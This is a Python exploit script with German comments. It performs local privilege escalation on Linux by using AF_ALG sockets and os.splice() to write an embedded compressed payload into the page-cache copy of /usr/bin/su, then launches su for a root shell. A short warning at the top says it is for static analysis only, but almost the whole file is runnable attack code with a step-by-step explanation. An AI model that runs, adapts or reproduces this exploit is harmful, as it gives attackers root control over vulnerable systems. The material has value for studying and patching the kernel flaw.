#!/usr/bin/env python3
"""
WARNUNG: Schadcode — nur zur statischen Analyse. Nicht ausführen.

Exploit-Typ: Lokale Privilege Escalation (LPE)
Technik:     AF_ALG-Socket + os.splice() → Dirty-Page im Kernel-Page-Cache

  AF_ALG + splice() Page-Cache-Exploit

  Userspace                    Kernel
  ─────────────────────────────────────────────────────────
                               ┌─────────────────────────┐
  /usr/bin/su (O_RDONLY)  ───► │  Page Cache             │
                               │  ┌──────────────────┐   │
                               │  │ su-Seite @ off=0 │◄──┼─── splice() schreibt
                               │  │ [AA BB CC DD ..] │   │    Payload hier rein
                               │  └──────────────────┘   │    (Dirty Page!)
                               └─────────────────────────┘
        │                                  ▲
        │ 1. sendmsg(MSG_MORE)             │
        ▼                                  │
  ┌────────────┐   2. setzt    ┌──────────────────────┐
  │  op_sock   │──CAN_MERGE──► │  Pipe                │
  │ (AF_ALG)   │               │  [payload_chunk]     │
  └────────────┘               └──────────────────────┘
        │                                  │
        │ 3. splice(su_fd → pipe_w)        │ 4. splice(pipe_r → op_sock)
        └──────────────────────────────────┘
               Page-Cache-Seite eingebunden →
               nächstes Schreiben landet direkt im Cache

  Ergebnis: /usr/bin/su im RAM gepatcht, SUID-Bit bleibt → Root-Shell
  ─────────────────────────────────────────────────────────────────────


Kernmechanismus (DirtyPipe-Variante, vgl. CVE-2022-0847):
  Linux verwaltet Dateiinhalte im Page Cache. splice() kann Seiten aus einer
  Datei zero-copy in eine Pipe einbinden. Wenn dabei PIPE_BUF_FLAG_CAN_MERGE
  gesetzt ist (durch vorheriges Befüllen der Pipe), wird ein anschließendes
  Schreiben in die Pipe direkt in die Seite des Page Cache geschrieben — auch
  wenn die Datei nur mit O_RDONLY geöffnet wurde.

  Der AF_ALG-Op-Socket verhält sich intern wie eine Pipe. sendmsg(MSG_MORE)
  setzt das CAN_MERGE-Flag. Das nachfolgende splice() von /usr/bin/su bindet
  dessen Page-Cache-Seite ein. Der zweite splice() in den AF_ALG-Socket
  schreibt dann den Payload-Chunk in diese Seite — womit /usr/bin/su im
  Speicher überschrieben wird, ohne Schreibrechte auf die Datei zu haben.

Angriffspfad:
  1. /usr/bin/su mit O_RDONLY öffnen
  2. AF_ALG AEAD-Socket aufbauen, op_sock via accept() erzeugen
  3. sendmsg(MSG_MORE): Payload-Chunk schreiben → setzt CAN_MERGE-Flag
  4. splice(su_fd → pipe_w): Page-Cache-Seite von su in Pipe einbinden
  5. splice(pipe_r → op_sock): schreibt Payload-Chunk in die Page-Cache-Seite
  6. Schritte 2–5 für jeden 4-Byte-Chunk des eingebetteten Payloads wiederholen
  7. os.system("su") — jetzt läuft die (im RAM gepatchte) Binary als Root

Betroffene Kernel: ~4.10–6.14 (je nach Patch-Stand)
"""

import os
import zlib
import socket

# Linux Kernel-Konstanten (aus <linux/if_alg.h> und <sys/socket.h>)
AF_ALG         = 38   # Socket-Familie: Kernel-Crypto-API
SOCK_SEQPACKET = 5    # sequenzierter, verbindungsorientierter Byte-Strom
SOL_ALG        = 279  # setsockopt-Level für AF_ALG-Optionen

# AF_ALG: Algorithmus-Typ und -Name
ALGO_TYPE = "aead"
# authencesn = Authenticated Encryption with Sequence Numbers:
#   - äußere Schicht: hmac(sha256) → Integritätsschutz
#   - innere Schicht: cbc(aes)     → Verschlüsselung
# Hier wird der Algorithmus nicht wirklich für Crypto genutzt —
# der AF_ALG-Socket dient als Träger für den splice()-Exploit.
ALGO_NAME = "authencesn(hmac(sha256),cbc(aes))"

# AF_ALG setsockopt-Optionen (aus <linux/if_alg.h>)
ALG_SET_KEY           = 1  # Crypto-Key setzen
ALG_SET_IV            = 2  # Initialisierungsvektor (als struct af_alg_iv)
ALG_SET_OP            = 3  # Operation: 0=encrypt, 1=decrypt
ALG_SET_AEAD_AUTHSIZE = 4  # Auth-Tag-Länge in Bytes
ALG_SET_PUBKEY        = 5  # (für asymmetrische Algos; hier: Auth-Tag-Größe via optlen)

# AES-Key-Struktur: 8-Byte-Header + 32 Null-Bytes
# Header-Bytes 0x08,0x00,0x01,0x00,0x00,0x00,0x00,0x10:
#   Byte 0–1: Flags (0x0008)
#   Byte 2–3: Type  (0x0001 = CRYPTO_ALG_TYPE_AEAD)
#   Byte 4–7: Key-Länge in Bits (0x10000000 LE = 256 bit → 32 Byte AES-Key)
# Die 32 Null-Bytes sind der eigentliche AES-Key (nur Nullen → schwacher Key,
# kryptografische Stärke ist für den Exploit irrelevant).
CRYPTO_KEY = bytes.fromhex("0800010000000010" + "00" * 32)

# Eingebetteter zlib-komprimierter Payload.
# Nach Dekompression: Binär-Patch-Daten für /usr/bin/su (ca. 50–100 Bytes),
# aufgeteilt in 4-Byte-Chunks, die jeweils an den entsprechenden Offset
# in der Binary geschrieben werden.
COMPRESSED_PAYLOAD_HEX = (
    "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d"
    "209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675"
    "c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
)


def process_chunk_via_kernel_crypto(su_fd: int, chunk_offset: int, payload_chunk: bytes):
    """
    Schreibt einen 4-Byte-Chunk des Payloads an Position chunk_offset in den
    Page Cache von /usr/bin/su — ohne Schreibrechte auf die Datei zu benötigen.

    Exploit-Schritte im Detail:
      1. AF_ALG AEAD-Socket aufbauen (alg_sock → op_sock via accept)
      2. sendmsg(MSG_MORE): Payload-Chunk in den internen Socket-Puffer schreiben.
         MSG_MORE signalisiert dem Kernel "weitere Daten folgen" und setzt intern
         PIPE_BUF_FLAG_CAN_MERGE — das ist die Voraussetzung für den Schreibzugriff.
      3. splice(su_fd → pipe_w): liest read_size Bytes aus /usr/bin/su und bindet
         die zugehörige Page-Cache-Seite in die Pipe ein (zero-copy).
      4. splice(pipe_r → op_sock): überträgt die Pipe-Seite zum AF_ALG-Socket.
         Wegen CAN_MERGE wird der Payload-Chunk (aus Schritt 2) direkt in die
         Page-Cache-Seite von /usr/bin/su eingeschrieben → Datei ist gepatcht.
      5. recv(): leert den Socket-Puffer (ohne das Ergebnis zu verwenden).
    """
    # Neuen AF_ALG-Socket pro Chunk: setzt CAN_MERGE-Zustand sauber zurück
    alg_sock = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)
    alg_sock.bind((ALGO_TYPE, ALGO_NAME))

    alg_sock.setsockopt(SOL_ALG, ALG_SET_KEY, CRYPTO_KEY)
    # optlen=4 über den 4. Parameter: setzt Auth-Tag-Größe auf 4 Byte
    alg_sock.setsockopt(SOL_ALG, ALG_SET_PUBKEY, None, 4)

    # accept() erzeugt den Op-Socket — verhält sich intern wie ein Pipe-Ende
    op_sock, _ = alg_sock.accept()

    # Wächst pro Iteration: 4, 8, 12, … — stellt sicher, dass splice()
    # jeweils die Seite enthält, die den aktuellen chunk_offset abdeckt.
    read_size = chunk_offset + 4
    iv_zero   = bytes(1)  # 0x00

    # sendmsg mit MSG_MORE (flags=32768):
    #   - Ancillary Data konfiguriert die Crypto-Operation (IV, OP, Auth-Tag)
    #   - Nutzdaten: 4-Byte-Nonce 0x41414141 ("AAAA") + der Payload-Chunk
    #   - MSG_MORE → Kernel hält die Seite offen, setzt CAN_MERGE
    op_sock.sendmsg(
        [b"\x41" * 4 + payload_chunk],
        [
            # OP=0 → encrypt (Richtung spielt für den Exploit keine Rolle)
            (SOL_ALG, ALG_SET_OP, iv_zero * 4),
            # struct af_alg_iv { u32 ivlen=0x10; u8 iv[16]=0x00…; }
            (SOL_ALG, ALG_SET_IV, b"\x10" + iv_zero * 19),
            # Auth-Tag-Größe = 8 Byte (als Little-Endian-u32: 0x08000000)
            (SOL_ALG, ALG_SET_AEAD_AUTHSIZE, b"\x08" + iv_zero * 3),
        ],
        32768,  # MSG_MORE
    )

    # Pipe als Brücke: su-Page-Cache-Seite einbinden (offset_src=0 → immer
    # ab Dateianfang lesen, damit die Seite mit chunk_offset enthalten ist)
    pipe_r, pipe_w = os.pipe()
    os.splice(su_fd,  pipe_w,           read_size, offset_src=0)
    os.splice(pipe_r, op_sock.fileno(), read_size)

    # Puffer leeren — Fehler beim recv sind normal (Exploit hat bereits gewirkt)
    try:
        op_sock.recv(8 + chunk_offset)
    except Exception:
        pass


def main():
    # O_RDONLY (=0): kein Schreibrecht — der Exploit umgeht das via Page Cache
    su_fd = os.open("/usr/bin/su", os.O_RDONLY)

    # Payload dekomprimieren: enthält die Patch-Bytes für /usr/bin/su,
    # geordnet nach Ziel-Offset (Byte 0–3 → Offset 0, Byte 4–7 → Offset 4, …)
    payload = zlib.decompress(bytes.fromhex(COMPRESSED_PAYLOAD_HEX))

    # Jeden 4-Byte-Chunk an seinen Ziel-Offset in /usr/bin/su schreiben.
    # Nach der Schleife ist die Binary im Page Cache vollständig gepatcht.
    offset = 0
    while offset < len(payload):
        chunk = payload[offset : offset + 4]
        process_chunk_via_kernel_crypto(su_fd, offset, chunk)
        offset += 4

    # Gepatchtes su starten — läuft mit SUID-Bit als Root,
    # führt nun vom Angreifer kontrollierten Code aus.
    os.system("su")


if __name__ == "__main__":
    main()
